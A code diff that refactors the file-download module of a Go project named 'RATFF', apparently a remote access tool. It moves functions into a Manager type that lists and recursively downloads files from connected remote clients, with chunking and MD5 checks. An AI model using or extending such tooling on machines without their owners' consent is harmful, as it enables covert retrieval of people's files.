@@ -1,4 +1,4 @@
-package main
+package client
 
 import (
 	"crypto/md5"
@@ -12,17 +12,28 @@ import (
 	"RATFF/shared"
 )
 
-func downloadFile(id, remotePath, localPath string) {
-	if isRemoteDirectory(id, remotePath) {
-		downloadDirectory(id, remotePath, localPath)
+// ProgressBarCreator creates a progress bar for file transfers.
+type ProgressBarCreator func(total int64, filename string) ProgressBar
+
+// ProgressBar interface for progress display.
+type ProgressBar interface {
+	Add(n int64)
+	Display()
+	MarkDone()
+}
+
+// DownloadFile downloads a file or directory from the remote client.
+func (m *Manager) DownloadFile(id, remotePath, localPath string, newProgressBar ProgressBarCreator) {
+	if m.isRemoteDirectory(id, remotePath) {
+		m.downloadDirectory(id, remotePath, localPath, newProgressBar)
 		return
 	}
 
-	downloadSingleFile(id, remotePath, localPath)
+	m.downloadSingleFile(id, remotePath, localPath, newProgressBar)
 }
 
-func isRemoteDirectory(id, remotePath string) bool {
-	msg := waitForCommandResponseRaw(id, shared.CmdFileList, map[string]interface{}{"path": remotePath}, 10*time.Second)
+func (m *Manager) isRemoteDirectory(id, remotePath string) bool {
+	msg := m.WaitForResponseRaw(id, shared.CmdFileList, map[string]interface{}{"path": remotePath}, 10*time.Second)
 	if msg == nil {
 		return false
 	}
@@ -36,7 +47,7 @@ func isRemoteDirectory(id, remotePath string) bool {
 	return hasFiles
 }
 
-func downloadSingleFile(id, remotePath, localPath string) {
+func (m *Manager) downloadSingleFile(id, remotePath, localPath string, newProgressBar ProgressBarCreator) {
 	filename := filepath.Base(remotePath)
 
 	if localPath == "" || localPath == "." {
@@ -48,32 +59,32 @@ func downloadSingleFile(id, remotePath, localPath string) {
 	dir := filepath.Dir(localPath)
 	if dir != "." && dir != "/" {
 		if err := os.MkdirAll(dir, 0755); err != nil {
-			PrintError(Tf("create_dir_failed", dir, err))
+			m.Print.Error(m.Tf("create_dir_failed", dir, err))
 			return
 		}
 	}
 
 	fileID := shared.GenerateID()
 
-	PrintInfo(Tf("download_starting", filename, remotePath))
+	m.Print.Info(m.Tf("download_starting", filename, remotePath))
 
 	payload := map[string]interface{}{
 		"file_id":    fileID,
 		"local_path": remotePath,
 	}
 
-	msg := waitForCommandResponseWithMsg(id, shared.CmdFileDownloadStart, payload, 10*time.Second)
+	msg := m.WaitForResponseWithMsg(id, shared.CmdFileDownloadStart, payload, 10*time.Second)
 	if msg == nil {
 		return
 	}
 
 	if msg.Payload == nil {
-		PrintError(T("download_start_failed"))
+		m.Print.Error(m.T("download_start_failed"))
 		return
 	}
 
 	if errMsg, ok := msg.Payload["error"].(string); ok {
-		PrintError(Tf("download_start_failed_detail", errMsg))
+		m.Print.Error(m.Tf("download_start_failed_detail", errMsg))
 		return
 	}
 
@@ -82,7 +93,7 @@ func downloadSingleFile(id, remotePath, localPath string) {
 
 	outFile, err := os.Create(localPath)
 	if err != nil {
-		PrintError(Tf("file_create_failed", localPath, err))
+		m.Print.Error(m.Tf("file_create_failed", localPath, err))
 		return
 	}
 	defer outFile.Close()
@@ -90,7 +101,7 @@ func downloadSingleFile(id, remotePath, localPath string) {
 	totalChunksF, _ := msg.Payload["total_chunks"].(float64)
 	totalChunks := int(totalChunksF)
 
-	progressBar := NewProgressBar(fileSize, filename)
+	progressBar := newProgressBar(fileSize, filename)
 
 	md5hash := md5.New()
 
@@ -100,25 +111,25 @@ func downloadSingleFile(id, remotePath, localPath string) {
 			"chunk_index": i,
 		}
 
-		chunkMsg := waitForCommandResponseWithMsg(id, shared.CmdFileDownloadChunk, chunkPayload, chunkTimeout)
+		chunkMsg := m.WaitForResponseWithMsg(id, shared.CmdFileDownloadChunk, chunkPayload, chunkTimeout)
 		if chunkMsg == nil {
 			progressBar.MarkDone()
 			progressBar.Display()
-			PrintError(Tf("download_chunk_failed", i))
+			m.Print.Error(m.Tf("download_chunk_failed", i))
 			return
 		}
 
 		if chunkMsg.Payload == nil {
 			progressBar.MarkDone()
 			progressBar.Display()
-			PrintError(Tf("download_chunk_empty", i))
+			m.Print.Error(m.Tf("download_chunk_empty", i))
 			return
 		}
 
 		if errMsg, ok := chunkMsg.Payload["error"].(string); ok {
 			progressBar.MarkDone()
 			progressBar.Display()
-			PrintError(Tf("download_chunk_failed_detail", i, errMsg))
+			m.Print.Error(m.Tf("download_chunk_failed_detail", i, errMsg))
 			return
 		}
 
@@ -127,7 +138,7 @@ func downloadSingleFile(id, remotePath, localPath string) {
 		if err != nil {
 			progressBar.MarkDone()
 			progressBar.Display()
-			PrintError(Tf("decode_chunk_failed", err))
+			m.Print.Error(m.Tf("decode_chunk_failed", err))
 			return
 		}
 
@@ -135,7 +146,7 @@ func downloadSingleFile(id, remotePath, localPath string) {
 		if err != nil {
 			progressBar.MarkDone()
 			progressBar.Display()
-			PrintError(Tf("write_chunk_failed", err))
+			m.Print.Error(m.Tf("write_chunk_failed", err))
 			return
 		}
 
@@ -148,11 +159,11 @@ func downloadSingleFile(id, remotePath, localPath string) {
 		"file_id": fileID,
 	}
 
-	msg = waitForCommandResponseWithMsg(id, shared.CmdFileDownloadComplete, completePayload, 10*time.Second)
+	msg = m.WaitForResponseWithMsg(id, shared.CmdFileDownloadComplete, completePayload, 10*time.Second)
 	if msg == nil {
 		progressBar.MarkDone()
 		progressBar.Display()
-		PrintError(T("download_complete_failed"))
+		m.Print.Error(m.T("download_complete_failed"))
 		return
 	}
 
@@ -163,12 +174,12 @@ func downloadSingleFile(id, remotePath, localPath string) {
 		if remoteMD5, ok := msg.Payload["md5"].(string); ok {
 			localMD5 := hex.EncodeToString(md5hash.Sum(nil))
 			if remoteMD5 != localMD5 {
-				PrintWarn(Tf("download_md5_mismatch", localMD5, remoteMD5))
+				m.Print.Warn(m.Tf("download_md5_mismatch", localMD5, remoteMD5))
 			} else {
-				PrintSuccess(Tf("download_success", remotePath, localPath))
+				m.Print.Success(m.Tf("download_success", remotePath, localPath))
 			}
 		} else {
-			PrintSuccess(Tf("download_success", remotePath, localPath))
+			m.Print.Success(m.Tf("download_success", remotePath, localPath))
 		}
 	}
 }
@@ -178,8 +189,8 @@ type remoteEntry struct {
 	IsDir bool
 }
 
-func listRemoteDir(id, path string) ([]remoteEntry, error) {
-	msg := waitForCommandResponseRaw(id, shared.CmdFileList, map[string]interface{}{"path": path}, 10*time.Second)
+func (m *Manager) listRemoteDir(id, path string) ([]remoteEntry, error) {
+	msg := m.WaitForResponseRaw(id, shared.CmdFileList, map[string]interface{}{"path": path}, 10*time.Second)
 	if msg == nil {
 		return nil, fmt.Errorf("no response")
 	}
@@ -208,54 +219,54 @@ func listRemoteDir(id, path string) ([]remoteEntry, error) {
 	return entries, nil
 }
 
-func downloadDirectory(id, remoteDir, localDir string) {
+func (m *Manager) downloadDirectory(id, remoteDir, localDir string, newProgressBar ProgressBarCreator) {
 	dirName := filepath.Base(remoteDir)
 	if localDir == "" || localDir == "." {
 		localDir = dirName
 	}
 
 	if err := os.MkdirAll(localDir, 0755); err != nil {
-		PrintError(Tf("create_dir_failed", localDir, err))
+		m.Print.Error(m.Tf("create_dir_failed", localDir, err))
 		return
 	}
 
-	PrintInfo(Tf("download_dir_starting", dirName, remoteDir))
+	m.Print.Info(m.Tf("download_dir_starting", dirName, remoteDir))
 
 	var allFiles []struct {
 		RemotePath string
 		LocalPath  string
 	}
 
-	err := walkRemoteDir(id, remoteDir, localDir, &allFiles)
+	err := m.walkRemoteDir(id, remoteDir, localDir, &allFiles)
 	if err != nil {
-		PrintError(Tf("download_dir_walk_failed", remoteDir, err))
+		m.Print.Error(m.Tf("download_dir_walk_failed", remoteDir, err))
 		return
 	}
 
 	if len(allFiles) == 0 {
-		PrintInfo(Tf("download_dir_empty", dirName))
+		m.Print.Info(m.Tf("download_dir_empty", dirName))
 		return
 	}
 
-	PrintInfo(Tf("download_dir_file_count", len(allFiles)))
+	m.Print.Info(m.Tf("download_dir_file_count", len(allFiles)))
 
 	successCount := 0
 	for i, f := range allFiles {
 		relPath, _ := filepath.Rel(localDir, f.LocalPath)
-		PrintInfo(Tf("download_dir_file", i+1, len(allFiles), relPath))
+		m.Print.Info(m.Tf("download_dir_file", i+1, len(allFiles), relPath))
 
-		downloadSingleFile(id, f.RemotePath, f.LocalPath)
+		m.downloadSingleFile(id, f.RemotePath, f.LocalPath, newProgressBar)
 		successCount++
 	}
 
-	PrintSuccess(Tf("download_dir_success", dirName, localDir, successCount, len(allFiles)))
+	m.Print.Success(m.Tf("download_dir_success", dirName, localDir, successCount, len(allFiles)))
 }
 
-func walkRemoteDir(id, remoteDir, localDir string, allFiles *[]struct {
+func (m *Manager) walkRemoteDir(id, remoteDir, localDir string, allFiles *[]struct {
 	RemotePath string
 	LocalPath  string
 }) error {
-	entries, err := listRemoteDir(id, remoteDir)
+	entries, err := m.listRemoteDir(id, remoteDir)
 	if err != nil {
 		return err
 	}
@@ -267,11 +278,11 @@ func walkRemoteDir(id, remoteDir, localDir string, allFiles *[]struct {
 
 		if entry.IsDir {
 			if err := os.MkdirAll(localPath, 0755); err != nil {
-				PrintWarn(Tf("create_dir_failed", localPath, err))
+				m.Print.Warn(m.Tf("create_dir_failed", localPath, err))
 				continue
 			}
-			if err := walkRemoteDir(id, remotePath, localPath, allFiles); err != nil {
-				PrintWarn(Tf("download_dir_walk_failed", remotePath, err))
+			if err := m.walkRemoteDir(id, remotePath, localPath, allFiles); err != nil {
+				m.Print.Warn(m.Tf("download_dir_walk_failed", remotePath, err))
 				continue
 			}
 		} else {
